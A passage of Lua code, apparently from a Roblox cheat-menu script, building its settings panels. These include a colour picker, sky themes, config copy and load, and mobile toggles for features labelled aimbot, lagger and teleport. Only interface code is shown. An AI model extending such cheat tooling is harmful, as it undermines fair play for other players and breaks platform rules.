            row.Size = UDim2.new(ROW_W, 0, 0, 36)

            local swatch = Instance.new("TextButton", row)
            swatch.Size = UDim2.new(0, 54, 0, 24)
            swatch.Position = UDim2.new(1, -60, 0.5, -12)
            swatch.BackgroundColor3 = _G.PureRadiusCircleColor or Color3.fromRGB(201, 238, 255)
            swatch.BorderSizePixel = 0
            swatch.Text = ""
            swatch.AutoButtonColor = false
            swatch.ZIndex = 6
            Instance.new("UICorner", swatch).CornerRadius = UDim.new(0, 7)
            local swStroke = Instance.new("UIStroke", swatch)
            swStroke.Color = WHITE; swStroke.Thickness = 1.4; swStroke.Transparency = 0.15

            -- Stato HSV, inizializzato dal colore salvato
            local h, sat, val = (_G.PureRadiusCircleColor or Color3.fromRGB(201, 238, 255)):ToHSV()
            local pickerGui = nil

            local function applyColour()
                local c = Color3.fromHSV(h, sat, val)
                swatch.BackgroundColor3 = c
                if _G.PureSetRadiusCircleColor then pcall(_G.PureSetRadiusCircleColor, c) end
            end

            local function closePicker()
                if pickerGui then pcall(function() pickerGui:Destroy() end); pickerGui = nil end
                saveConfig()
            end

            local function openPicker()
                if pickerGui then closePicker(); return end

                pickerGui = Instance.new("ScreenGui")
                pickerGui.Name = "PureRadiusColourPicker"
                pickerGui.ResetOnSpawn = false
                pickerGui.IgnoreGuiInset = true
                pickerGui.DisplayOrder = 9999
                pickerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                if not pcall(function() pickerGui.Parent = game:GetService("CoreGui") end) then
                    pickerGui.Parent = LP:WaitForChild("PlayerGui")
                end

                local backdrop = Instance.new("TextButton", pickerGui)
                backdrop.Size = UDim2.new(1, 0, 1, 0)
                backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                backdrop.BackgroundTransparency = 0.5
                backdrop.BorderSizePixel = 0
                backdrop.Text = ""
                backdrop.AutoButtonColor = false
                backdrop.ZIndex = 1

                local panel = Instance.new("Frame", pickerGui)
                panel.Size = UDim2.new(0, 280, 0, 300)
                panel.Position = UDim2.new(0.5, -140, 0.5, -150)
                panel.BackgroundColor3 = DARK
                panel.BorderSizePixel = 0
                panel.ZIndex = 2
                Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 14)
                local pStroke = Instance.new("UIStroke", panel)
                pStroke.Color = WHITE; pStroke.Thickness = 1.4; pStroke.Transparency = 0.3

                local title = Instance.new("TextLabel", panel)
                title.Size = UDim2.new(1, -20, 0, 34)
                title.Position = UDim2.new(0, 14, 0, 4)
                title.BackgroundTransparency = 1
                title.Text = "RADIUS CIRCLE COLOUR"
                title.TextColor3 = WHITE
                title.Font = Enum.Font.GothamBlack
                title.TextSize = 12
                title.TextXAlignment = Enum.TextXAlignment.Left
                title.ZIndex = 3

                local closeBtn = Instance.new("TextButton", panel)
                closeBtn.Size = UDim2.new(0, 26, 0, 26)
                closeBtn.Position = UDim2.new(1, -34, 0, 8)
                closeBtn.BackgroundColor3 = Color3.fromRGB(12, 28, 43)
                closeBtn.BorderSizePixel = 0
                closeBtn.Text = "X"
                closeBtn.TextColor3 = WHITE
                closeBtn.Font = Enum.Font.GothamBlack
                closeBtn.TextSize = 11
                closeBtn.AutoButtonColor = false
                closeBtn.ZIndex = 4
                Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)

                -- ---- Quadrato Saturation / Value ----
                local sv = Instance.new("ImageLabel", panel)
                sv.Size = UDim2.new(0, 252, 0, 150)
                sv.Position = UDim2.new(0, 14, 0, 42)
                sv.BackgroundColor3 = Color3.fromHSV(h, 1, 1)
                sv.BorderSizePixel = 0
                sv.ZIndex = 3
                Instance.new("UICorner", sv).CornerRadius = UDim.new(0, 8)

                -- bianco -> trasparente (orizzontale)
                local whiteGrad = Instance.new("Frame", sv)
                whiteGrad.Size = UDim2.new(1, 0, 1, 0)
                whiteGrad.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                whiteGrad.BorderSizePixel = 0
                whiteGrad.ZIndex = 4
                Instance.new("UICorner", whiteGrad).CornerRadius = UDim.new(0, 8)
                local wg = Instance.new("UIGradient", whiteGrad)
                wg.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 0),
                    NumberSequenceKeypoint.new(1, 1),
                })

                -- nero -> trasparente (verticale)
                local blackGrad = Instance.new("Frame", sv)
                blackGrad.Size = UDim2.new(1, 0, 1, 0)
                blackGrad.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                blackGrad.BorderSizePixel = 0
                blackGrad.ZIndex = 5
                Instance.new("UICorner", blackGrad).CornerRadius = UDim.new(0, 8)
                local bg = Instance.new("UIGradient", blackGrad)
                bg.Rotation = 90
                bg.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 1),
                    NumberSequenceKeypoint.new(1, 0),
                })

                local svDot = Instance.new("Frame", sv)
                svDot.Size = UDim2.new(0, 12, 0, 12)
                svDot.AnchorPoint = Vector2.new(0.5, 0.5)
                svDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                svDot.BorderSizePixel = 0
                svDot.ZIndex = 7
                Instance.new("UICorner", svDot).CornerRadius = UDim.new(1, 0)
                local dotStroke = Instance.new("UIStroke", svDot)
                dotStroke.Color = Color3.fromRGB(0, 0, 0); dotStroke.Thickness = 1.6

                -- ---- Barra Hue ----
                local hueBar = Instance.new("Frame", panel)
                hueBar.Size = UDim2.new(0, 252, 0, 22)
                hueBar.Position = UDim2.new(0, 14, 0, 202)
                hueBar.BorderSizePixel = 0
                hueBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                hueBar.ZIndex = 3
                Instance.new("UICorner", hueBar).CornerRadius = UDim.new(0, 7)
                local hueGrad = Instance.new("UIGradient", hueBar)
                local hueKeys = {}
                for i = 0, 6 do
                    table.insert(hueKeys, ColorSequenceKeypoint.new(i/6, Color3.fromHSV(i/6, 1, 1)))
                end
                hueGrad.Color = ColorSequence.new(hueKeys)

                local hueDot = Instance.new("Frame", hueBar)
                hueDot.Size = UDim2.new(0, 6, 1, 6)
                hueDot.AnchorPoint = Vector2.new(0.5, 0.5)
                hueDot.Position = UDim2.new(h, 0, 0.5, 0)
                hueDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                hueDot.BorderSizePixel = 0
                hueDot.ZIndex = 5
                Instance.new("UICorner", hueDot).CornerRadius = UDim.new(0, 3)
                local hueDotStroke = Instance.new("UIStroke", hueDot)
                hueDotStroke.Color = Color3.fromRGB(0, 0, 0); hueDotStroke.Thickness = 1.4

                -- ---- Anteprima ----
                local preview = Instance.new("Frame", panel)
                preview.Size = UDim2.new(0, 252, 0, 40)
                preview.Position = UDim2.new(0, 14, 0, 236)
                preview.BorderSizePixel = 0
                preview.ZIndex = 3
                Instance.new("UICorner", preview).CornerRadius = UDim.new(0, 8)
                local prevStroke = Instance.new("UIStroke", preview)
                prevStroke.Color = WHITE; prevStroke.Thickness = 1.2; prevStroke.Transparency = 0.4

                local hexLabel = Instance.new("TextLabel", preview)
                hexLabel.Size = UDim2.new(1, 0, 1, 0)
                hexLabel.BackgroundTransparency = 1
                hexLabel.Font = Enum.Font.GothamBlack
                hexLabel.TextSize = 13
                hexLabel.ZIndex = 4

                local function refreshUI()
                    local c = Color3.fromHSV(h, sat, val)
                    sv.BackgroundColor3 = Color3.fromHSV(h, 1, 1)
                    svDot.Position = UDim2.new(sat, 0, 1 - val, 0)
                    hueDot.Position = UDim2.new(h, 0, 0.5, 0)
                    preview.BackgroundColor3 = c
                    local r8 = math.floor(c.R*255+0.5)
                    local g8 = math.floor(c.G*255+0.5)
                    local b8 = math.floor(c.B*255+0.5)
                    hexLabel.Text = string.format("#%02X%02X%02X   (%d, %d, %d)", r8, g8, b8, r8, g8, b8)
                    -- testo leggibile su qualunque sfondo
                    local lum = 0.299*c.R + 0.587*c.G + 0.114*c.B
                    hexLabel.TextColor3 = lum > 0.55 and Color3.fromRGB(8, 31, 48) or Color3.fromRGB(255,255,255)
                    applyColour()
                end

                -- ---- Input drag ----
                local UIS = game:GetService("UserInputService")

                local function bindDrag(frame, onMove)
                    local dragging = false
                    local function handle(input)
                        local abs, size = frame.AbsolutePosition, frame.AbsoluteSize
                        local px = math.clamp((input.Position.X - abs.X) / size.X, 0, 1)
                        local py = math.clamp((input.Position.Y - abs.Y) / size.Y, 0, 1)
                        onMove(px, py)
                    end
                    frame.InputBegan:Connect(function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1
                        or input.UserInputType == Enum.UserInputType.Touch then
                            dragging = true; handle(input)
                        end
                    end)
                    frame.InputEnded:Connect(function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1
                        or input.UserInputType == Enum.UserInputType.Touch then
                            dragging = false; saveConfig()
                        end
                    end)
                    UIS.InputChanged:Connect(function(input)
                        if not dragging then return end
                        if input.UserInputType == Enum.UserInputType.MouseMovement
                        or input.UserInputType == Enum.UserInputType.Touch then
                            handle(input)
                        end
                    end)
                    UIS.InputEnded:Connect(function(input)
                        if input.UserInputType == Enum.UserInputType.MouseButton1
                        or input.UserInputType == Enum.UserInputType.Touch then
                            if dragging then dragging = false; saveConfig() end
                        end
                    end)
                end

                bindDrag(sv, function(px, py) sat = px; val = 1 - py; refreshUI() end)
                bindDrag(hueBar, function(px, _) h = px; refreshUI() end)

                closeBtn.MouseButton1Click:Connect(closePicker)
                backdrop.MouseButton1Click:Connect(closePicker)

                refreshUI()

                panel.Size = UDim2.new(0, 0, 0, 0)
                panel.Position = UDim2.new(0.5, 0, 0.5, 0)
                TS:Create(panel, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                    Size = UDim2.new(0, 280, 0, 300),
                    Position = UDim2.new(0.5, -140, 0.5, -150),
                }):Play()
            end

            swatch.MouseButton1Click:Connect(openPicker)
        end

        -- ---------------- AVATAR CHANGER ----------------
        mkSect(sfVisual, "Avatar Changer")
        do
            local AC = _G.PureAvatarChanger
            if AC then
                for _, cat in ipairs(AC.categories) do
                    local entry = AC.state[cat.Name]
                    if entry then
                        mkToggle(sfVisual, cat.Name, function(on)
                            entry.enabled = on == true
                            if on then
                                if entry.savedId then
                                    local id, at, nm = entry.savedId, cat.AssetTypes[1], entry.savedName
                                    task.spawn(function() pcall(AC.equipItem, id, at, nm) end)
                                end
                            else
                                pcall(AC.removeItem, cat.AssetTypes[1], entry.savedName)
                            end
                            saveConfig()
                        end, entry.enabled == true)
                        mkActionRow(sfVisual, cat.Name .. " — Pick Item", function()
                            pcall(AC.openPicker, cat.Name, cat.AssetTypes)
                        end)
                    end
                end
            end
        end
    end
    -- =================== END AMBITIOUS PORTS (GUI ROWS) ===================


    mkSect(sfVisual, "Button Shapes")
    setCircleBtnsVisual = mkToggle(sfVisual, "Circle Buttons", function(on)
        __HH.circleButtonsEnabled=on
        if on then __HH.shapeButtonsEnabled=false; __HH.rectangularButtonsEnabled=false
            if setShapeVisual then setShapeVisual(false) end
            if setRectVisual then setRectVisual(false) end
        end
        if __HH.mobGuiRef then buildMobileButtons() end; saveConfig()
    end, __HH.circleButtonsEnabled)

    setShapeVisual = mkToggle(sfVisual, "Shape Buttons", function(on)
        __HH.shapeButtonsEnabled=on
        if on then __HH.circleButtonsEnabled=false; __HH.rectangularButtonsEnabled=false
            if setCircleBtnsVisual then setCircleBtnsVisual(false) end
            if setRectVisual then setRectVisual(false) end
        end
        if __HH.mobGuiRef then buildMobileButtons() end; saveConfig()
    end, __HH.shapeButtonsEnabled)

    setRectVisual = mkToggle(sfVisual, "Rectangular Buttons", function(on)
        __HH.rectangularButtonsEnabled=on
        if on then __HH.circleButtonsEnabled=false; __HH.shapeButtonsEnabled=false
            if setCircleBtnsVisual then setCircleBtnsVisual(false) end
            if setShapeVisual then setShapeVisual(false) end
        end
        if __HH.mobGuiRef then buildMobileButtons() end; saveConfig()
    end, __HH.rectangularButtonsEnabled)

    mkSect(sfVisual, "Sky Theme")
    do
        local skyThemes = SKY_PRESETS_LIST or {"Off", "Night", "Aurora", "Sunset", "Galaxy", "Tech", "Sakura", "Pink Night", "Blood Moon", "Emerald Dawn", "Volcanic", "Arctic", "Midnight Ocean", "Vaporwave", "Toxic", "Solar Eclipse", "Hellscape", "Heaven", "Storm", "Sunrise", "Deep Space", "Lavender Dream", "Inferno", "Mint Sky"}
        local skyIndex = 1
        for i, name in ipairs(skyThemes) do if name == __HH.currentSkyTheme then skyIndex = i break end end
        
        local row = mkRow(sfVisual); mkLabel(row, "Sky Theme")
        row.Size = UDim2.new(ROW_W, 0, 0, 42)
        row.ClipsDescendants = true
        
        local left = Instance.new("TextButton", row)
        left.BackgroundColor3 = Color3.fromRGB(5, 14, 23); left.BackgroundTransparency = 0.04
        left.Text = "<"; left.TextColor3 = Color3.fromRGB(201, 238, 255); left.TextSize = 12
        left.Font = Enum.Font.GothamSemibold; left.Size = UDim2.new(0, 42, 0, 28)
        left.Position = UDim2.new(1, -186, 0.5, -14); left.BorderSizePixel = 0; left.ZIndex = 8
        Instance.new("UICorner", left).CornerRadius = UDim.new(0, 8)
        local leftStroke = Instance.new("UIStroke", left); leftStroke.Color = Color3.fromRGB(59, 93, 119); leftStroke.Transparency = 0.42
        
        local holder = Instance.new("Frame", row)
        holder.BackgroundColor3 = Color3.fromRGB(0, 0, 0); holder.BackgroundTransparency = 0.28
        holder.Size = UDim2.new(0, 92, 0, 28); holder.Position = UDim2.new(1, -139, 0.5, -14); holder.ClipsDescendants = true; holder.ZIndex = 7
        Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 8)
        local holderStroke = Instance.new("UIStroke", holder); holderStroke.Color = Color3.fromRGB(201, 238, 255); holderStroke.Transparency = 0.35
        
        skyValueLabel = Instance.new("TextLabel", holder)
        skyValueLabel.BackgroundTransparency = 1; skyValueLabel.Text = skyThemes[skyIndex]
        skyValueLabel.TextColor3 = Color3.fromRGB(201, 238, 255); skyValueLabel.TextSize = 11
        skyValueLabel.Font = Enum.Font.GothamSemibold; skyValueLabel.Size = UDim2.new(1, 0, 1, 0); skyValueLabel.ZIndex = 9
        skyValueLabel.TextXAlignment = Enum.TextXAlignment.Center
        
        local right = Instance.new("TextButton", row)
        right.BackgroundColor3 = Color3.fromRGB(5, 14, 23); right.BackgroundTransparency = 0.04
        right.Text = ">"; right.TextColor3 = Color3.fromRGB(201, 238, 255); right.TextSize = 12
        right.Font = Enum.Font.GothamSemibold; right.Size = UDim2.new(0, 42, 0, 28)
        right.Position = UDim2.new(1, -42, 0.5, -14); right.BorderSizePixel = 0; right.ZIndex = 8
        Instance.new("UICorner", right).CornerRadius = UDim.new(0, 8)
        local rightStroke = Instance.new("UIStroke", right); rightStroke.Color = Color3.fromRGB(59, 93, 119); rightStroke.Transparency = 0.42
        
        local function setSkyIndex(nextIndex)
            if nextIndex < 1 then nextIndex = #skyThemes end
            if nextIndex > #skyThemes then nextIndex = 1 end
            skyIndex = nextIndex
            __HH.currentSkyTheme = skyThemes[skyIndex]
            if type(applySkyTheme) == "function" then applySkyTheme(__HH.currentSkyTheme) end
            if skyValueLabel then skyValueLabel.Text = __HH.currentSkyTheme end
            saveConfig()
        end
        left.MouseButton1Click:Connect(function() setSkyIndex(skyIndex - 1) end)
        right.MouseButton1Click:Connect(function() setSkyIndex(skyIndex + 1) end)
    end


    do
        local row = mkRow(sfExtra)
        mkLabel(row, "Anim Changer")
        row.ZIndex = 10

        local pillBtn = Instance.new("TextButton", row)
        pillBtn.Size = UDim2.new(0, 62, 0, 26)
        pillBtn.Position = UDim2.new(1, -64, 0.5, -13)
        pillBtn.BackgroundColor3 = CHECK_OFF
        pillBtn.BackgroundTransparency = 0.08
        pillBtn.BorderSizePixel = 0
        pillBtn.Text = ""
        pillBtn.AutoButtonColor = false
        pillBtn.ZIndex = 5
        Instance.new("UICorner", pillBtn).CornerRadius = UDim.new(1, 0)
        local pillStroke = Instance.new("UIStroke", pillBtn)
        pillStroke.Color = BLUE_GLOW
        pillStroke.Thickness = 1.3
        pillStroke.Transparency = 0.16

        local valueLabel = Instance.new("TextLabel", pillBtn)
        valueLabel.Size = UDim2.new(1, -24, 1, 0)
        valueLabel.Position = UDim2.new(0, 6, 0, 0)
        valueLabel.BackgroundTransparency = 1
        valueLabel.TextColor3 = WHITE
        valueLabel.Font = Enum.Font.GothamBold
        valueLabel.TextSize = 9
        valueLabel.TextXAlignment = Enum.TextXAlignment.Center
        valueLabel.TextTruncate = Enum.TextTruncate.AtEnd
        valueLabel.ZIndex = 6

        local knob = Instance.new("Frame", pillBtn)
        knob.Size = UDim2.new(0, 18, 0, 18)
        knob.Position = UDim2.new(1, -22, 0.5, -9)
        knob.BackgroundColor3 = Color3.fromRGB(245, 250, 255)
        knob.BorderSizePixel = 0
        knob.ZIndex = 6
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local function refreshAcePackLabel()
            local pack = tostring(__HH.aceSelectedAnimationPack or "OFF")
            valueLabel.Text = pack
            local isOff = (pack:upper() == "OFF")
            pillBtn.BackgroundColor3 = isOff and CHECK_OFF or PILL_ON
        end
        local function setAcePack(index)
            if index < 1 then index = #__HH.aceAnimationPackList end
            if index > #__HH.aceAnimationPackList then index = 1 end
            __HH.aceAnimationPackIndex = index
            __HH.aceSelectedAnimationPack = __HH.aceAnimationPackList[index]
            refreshAcePackLabel()
            pcall(function() __HH.aceApplyAnimationPack(__HH.aceSelectedAnimationPack) end)
            saveConfig()
        end

        __HH.aceSyncAnimationPackIndex()
        refreshAcePackLabel()
        pillBtn.MouseButton1Click:Connect(function()
            setAcePack((__HH.aceAnimationPackIndex or 1) + 1)
        end)
    end

    mkSect(sfExtra, "Songs")
    for _, track in ipairs(HorizonSongTracks) do
        mkToggle(sfExtra, track.name, function(on)
            if on then playHorizonSong(track) else stopHorizonSong() end
        end, false)
    end

    mkSect(sfExtra, "Performance")
    mkToggle(sfExtra, "Nuke Optimizer", function(on)
        if on then
            pcall(function()
                Lighting.GlobalShadows = false; Lighting.FogEnd = 9e9
                Lighting.EnvironmentDiffuseScale = 0; Lighting.EnvironmentSpecularScale = 0
                for _, e in ipairs(Lighting:GetChildren()) do
                    if e:IsA("BloomEffect") or e:IsA("BlurEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("SunRaysEffect") or e:IsA("DepthOfFieldEffect") or e:IsA("Atmosphere") or e:IsA("Clouds") then
                        e:Destroy()
                    end
                end
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") or obj:IsA("Explosion") then
                        pcall(function() obj:Destroy() end)
                    end
                    if obj:IsA("BasePart") and not obj:IsDescendantOf(LP.Character) then
                        pcall(function() obj.CastShadow = false end)
                    end
                end
            end)
        end; saveConfig()
    end, false)

    do
        local scaleRow = mkRow(sfExtra)
        local scaleHolder = Instance.new("Frame", scaleRow)
        scaleHolder.Size = UDim2.new(0, 152, 0, 28)
        scaleHolder.Position = UDim2.new(0, 0, 0.5, -14)
        scaleHolder.BackgroundColor3 = INP_BG
        scaleHolder.BackgroundTransparency = 0.18
        scaleHolder.BorderSizePixel = 0
        scaleHolder.ZIndex = 5
        Instance.new("UICorner", scaleHolder).CornerRadius = UDim.new(0, 8)
        local shStroke = Instance.new("UIStroke", scaleHolder)
        shStroke.Color = Color3.fromRGB(82, 114, 152)
        shStroke.Thickness = 1.1
        shStroke.Transparency = 0.25

        local scaleTb = Instance.new("TextBox", scaleHolder)
        scaleTb.Size = UDim2.new(0, 64, 1, 0)
        scaleTb.Position = UDim2.new(0, 10, 0, 0)
        scaleTb.BackgroundTransparency = 1
        scaleTb.Text = tostring(uiScaleValue)
        scaleTb.TextColor3 = WHITE
        scaleTb.Font = Enum.Font.GothamSemibold
        scaleTb.TextSize = 14
        scaleTb.TextXAlignment = Enum.TextXAlignment.Left
        scaleTb.ClearTextOnFocus = false
        scaleTb.ZIndex = 6

        local scaleCaption = Instance.new("TextLabel", scaleHolder)
        scaleCaption.Size = UDim2.new(0, 74, 1, 0)
        scaleCaption.Position = UDim2.new(1, -82, 0, 0)
        scaleCaption.BackgroundTransparency = 1
        scaleCaption.Text = "UI Scale"
        scaleCaption.TextColor3 = Color3.fromRGB(205, 222, 244)
        scaleCaption.Font = Enum.Font.GothamMedium
        scaleCaption.TextSize = 11
        scaleCaption.TextXAlignment = Enum.TextXAlignment.Right
        scaleCaption.ZIndex = 6

        scaleTb.Focused:Connect(function()
            TS:Create(shStroke, TweenInfo.new(0.12), {Color = BLUE_GLOW, Transparency = 0}):Play()
        end)
        scaleTb.FocusLost:Connect(function()
            TS:Create(shStroke, TweenInfo.new(0.12), {Color = Color3.fromRGB(82, 114, 152), Transparency = 0.25}):Play()
            local v = tonumber(scaleTb.Text)
            if v and v >= 0.4 and v <= 1.3 then
                uiScaleValue = v
                if __HH.uiScaleObject then __HH.uiScaleObject.Scale = v end
                saveConfig()
            else
                scaleTb.Text = tostring(uiScaleValue)
            end
        end)
    end

    local devLbl
    do
        local row = mkRow(sfExtra)
        mkLabel(row, "Current Device")
        local devBadge = Instance.new("TextButton", row)
        devBadge.Size = UDim2.new(0, 106, 0, 26)
        devBadge.Position = UDim2.new(1, -108, 0.5, -13)
        devBadge.Text = __HH.selectedDevice or "MOBILE"
        devBadge.TextSize = 11
        devBadge.AutoButtonColor = false
        devBadge.ZIndex = 5
        styleCapsuleBtn(devBadge, false)
        devLbl = devBadge

        mkSect(sfExtra, "Mobile")
        local resetRow = mkRow(sfExtra)
        mkLabel(resetRow, "Reset Device")
        local resetDevBtn = Instance.new("TextButton", resetRow)
        resetDevBtn.Size = UDim2.new(0, 106, 0, 26)
        resetDevBtn.Position = UDim2.new(1, -108, 0.5, -13)
        resetDevBtn.Text = "Reset Device"
        resetDevBtn.TextSize = 11
        resetDevBtn.AutoButtonColor = false
        resetDevBtn.ZIndex = 5
        styleCapsuleBtn(resetDevBtn, true)
        resetDevBtn.MouseButton1Click:Connect(function()
            if __HH.runDeviceSelection then
                __HH.mainFrame.Visible = false
                __HH.runDeviceSelection(true)
                if devLbl then devLbl.Text = __HH.selectedDevice or "MOBILE" end
                __HH.mainFrame.Visible = true
            end
        end)
    end

    do
        local copyRow = mkRow(sfExtra)
        mkLabel(copyRow, "Copy Config")
        local copyBtn = Instance.new("TextButton", copyRow)
        copyBtn.Size = UDim2.new(0, 106, 0, 26)
        copyBtn.Position = UDim2.new(1, -108, 0.5, -13)
        copyBtn.Text = "Copy Config"
        copyBtn.TextSize = 11
        copyBtn.AutoButtonColor = false
        copyBtn.ZIndex = 5
        styleCapsuleBtn(copyBtn, true)

        local loadRow = mkRow(sfExtra)
        mkLabel(loadRow, "Load Config")
        local loadInput = Instance.new("TextBox", loadRow)
        loadInput.Size = UDim2.new(0, 118, 0, 24); loadInput.Position = UDim2.new(1, -184, 0.5, -12)
        loadInput.BackgroundColor3 = INP_BG; loadInput.PlaceholderText = "paste code"
        loadInput.Text = ""; loadInput.ClearTextOnFocus = false
        loadInput.TextColor3 = WHITE; loadInput.PlaceholderColor3 = Color3.fromRGB(130, 168, 208)
        loadInput.Font = Enum.Font.GothamSemibold; loadInput.TextSize = 9; loadInput.ZIndex = 5
        loadInput.ClipsDescendants = true
        Instance.new("UICorner", loadInput).CornerRadius = UDim.new(0, 7)
        local loadInputStroke = Instance.new("UIStroke", loadInput); loadInputStroke.Color = DIM_LINE; loadInputStroke.Thickness = 1.1; loadInputStroke.Transparency = 0.25

        local loadBtn = Instance.new("TextButton", loadRow)
        loadBtn.Size = UDim2.new(0, 60, 0, 24); loadBtn.Position = UDim2.new(1, -62, 0.5, -12)
        loadBtn.Text = "Load"; loadBtn.TextSize = 10
        loadBtn.AutoButtonColor = false; loadBtn.ZIndex = 5
        styleCapsuleBtn(loadBtn, true)

        local statusRow = mkRow(sfExtra)
        local statusLbl = Instance.new("TextLabel", statusRow)
        statusLbl.Size = UDim2.new(1, 0, 1, 0); statusLbl.BackgroundTransparency = 1
        statusLbl.Text = ""; statusLbl.TextColor3 = CYAN_SECT
        statusLbl.Font = Enum.Font.GothamBold; statusLbl.TextSize = 10
        statusLbl.TextXAlignment = Enum.TextXAlignment.Left; statusLbl.ZIndex = 5

        local function flashStatus(msg)
            statusLbl.Text = msg
            task.delay(3, function() if statusLbl.Text == msg then statusLbl.Text = "" end end)
        end

        copyBtn.MouseButton1Click:Connect(function()
            local ok, codeStr = pcall(function() return __HH.encodeConfigCode(__HH.buildConfigTable()) end)
            if ok and codeStr then
                local copied = false
                pcall(function()
                    if setclipboard then setclipboard(codeStr); copied = true
                    elseif toclipboard then toclipboard(codeStr); copied = true end
                end)
                if copied then
                    flashStatus("Config copied to clipboard!")
                else
                    loadInput.Text = codeStr
                    flashStatus("Clipboard unsupported - code placed in box above.")
                end
            else
                flashStatus("Failed to build config code.")
            end
        end)

        loadBtn.MouseButton1Click:Connect(function()
            local raw = loadInput.Text
            if not raw or raw == "" then flashStatus("Paste a config code first."); return end
            local ok, cfg = pcall(function() return __HH.decodeConfigCode(raw) end)
            if ok and type(cfg) == "table" then
                loadConfig(cfg)
                applyState()
                if __HH.mobileButtonsEnabled and buildMobileButtons then task.spawn(buildMobileButtons)
                elseif destroyMobileButtons then destroyMobileButtons() end
                if devLbl then devLbl.Text = __HH.selectedDevice or "MOBILE" end
                flashStatus("Config loaded successfully!")
                task.delay(0.3, function()
                    pcall(function()
                        if __HH.mainFrame then __HH.mainFrame:Destroy() end
                        buildGui()
                        applyState()
                        if __HH.mobileButtonsEnabled and buildMobileButtons then task.spawn(buildMobileButtons)
                        elseif destroyMobileButtons then destroyMobileButtons() end
                        if __HH.mainFrame then __HH.mainFrame.Visible = true end
                    end)
                end)
            else
                flashStatus("Invalid config code.")
            end
        end)

        local resetAllRow = mkRow(sfExtra)
        mkLabel(resetAllRow, "Reset All Settings")
        local resetAllBtn = Instance.new("TextButton", resetAllRow)
        resetAllBtn.Size = UDim2.new(0, 106, 0, 26); resetAllBtn.Position = UDim2.new(1, -108, 0.5, -13)
        resetAllBtn.Text = "Reset All"; resetAllBtn.TextSize = 11
        resetAllBtn.AutoButtonColor = false; resetAllBtn.ZIndex = 5
        styleCapsuleBtn(resetAllBtn, true)
        wireResetAllButton(resetAllBtn, "Reset All", flashStatus)
    end

    -- ─── Mobile Tab ─────────────────────────────────────────────────────────
    do
        mkSect(sfMobile, "Button Visibility")
        local mobBtnDefs = {
            {key="drop",         label="DROP BR"},
            {key="tpDown",       label="TP DOWN"},
            {key="batV2",        label="AIM BOT"},
            {key="tpLock",       label="TP BAT"},
            {key="lagger",       label="LAGGER"},
            {key="laggerCarry",  label="LAGGER CARRY"},
            {key="carrySpeed",   label="CARRY SPD"},
            {key="instaReset",   label="INSTA RESET"},
            {key="autoLeft",     label="AUTO LEFT"},
            {key="autoRight",    label="AUTO RIGHT"},
        }
        for _, def in ipairs(mobBtnDefs) do
            local key = def.key
            mkToggle(sfMobile, def.label, function(on)
                __HH.buttonVisibility[key] = on
                if __HH.mobileButtonsEnabled then buildMobileButtons() end
                saveConfig()
            end, __HH.buttonVisibility[key] ~= false)
        end

        -- ─── Mobile Settings ─────────────────────────────────────────────────
        mkSect(sfMobile, "Mobile Settings")

        local mobShowSet = mkToggle(sfMobile, "Show Mobile UI", function(on)
            __HH.mobileButtonsEnabled = on
            if on then buildMobileButtons() else destroyMobileButtons() end
            if setMobVisual then setMobVisual(on) end
            saveConfig()
        end, __HH.mobileButtonsEnabled)

        mkBoxRow(sfMobile, "Btn Size", __HH.mobileButtonsSize, function(v)
            if v >= 10 and v <= 200 then
                __HH.mobileButtonsSize = v
                if __HH.mobileButtonsEnabled then buildMobileButtons() end
                saveConfig()
            end
        end)

        local mobDragSet = mkToggle(sfMobile, "Btn Drag Per Btn", function(on)
            __HH.perButtonDragEnabled = on
            if __HH.mobileButtonsEnabled then buildMobileButtons() end
            saveConfig()
        end, __HH.perButtonDragEnabled)

        local mobLockSet = mkToggle(sfMobile, "Lock UI", function(on)
            __HH.uiLocked = on
            _G.YousefUiLocked = on
            if setLockVisual then setLockVisual(on) end
            saveConfig()
        end, __HH.uiLocked)

        do
            local row = mkRow(sfMobile); mkLabel(row, "Reset Mobile Btns")
            local resetBtn = Instance.new("TextButton", row)
            resetBtn.Size = UDim2.new(0,60,0,20); resetBtn.Position = UDim2.new(1,-65,0.5,-10)
            resetBtn.BackgroundColor3 = BTN_ACT; resetBtn.BorderSizePixel = 0
            resetBtn.Text = "Reset"; resetBtn.TextColor3 = WHITE
            resetBtn.Font = Enum.Font.GothamBold; resetBtn.TextSize = 9
            resetBtn.AutoButtonColor = false; resetBtn.ZIndex = 5
            Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0,5)
            local rStroke = Instance.new("UIStroke", resetBtn); rStroke.Color = WHITE; rStroke.Thickness = 1
            resetBtn.MouseButton1Click:Connect(function()
                resetBtnPositions()
                TS:Create(resetBtn, TweenInfo.new(0.1), {BackgroundColor3=WHITE}):Play()
                task.delay(0.15, function()
                    TS:Create(resetBtn, TweenInfo.new(0.1), {BackgroundColor3=BTN_ACT}):Play()
                end)
            end)
        end

        -- ─── Reset All Settings (Mobile tab copy) ──────────────────────────────
        -- Same shared reset as the Extra tab's button — every toggle, speed,
        -- keybind and mobile setting goes back to default. Kept here too so
        -- it's reachable straight from the Mobile tab without switching tabs.
        do
            local mobResetAllRow = mkRow(sfMobile)
            mkLabel(mobResetAllRow, "Reset All Settings")
            local mobResetAllBtn = Instance.new("TextButton", mobResetAllRow)
            mobResetAllBtn.Size = UDim2.new(0,90,0,20); mobResetAllBtn.Position = UDim2.new(1,-95,0.5,-10)
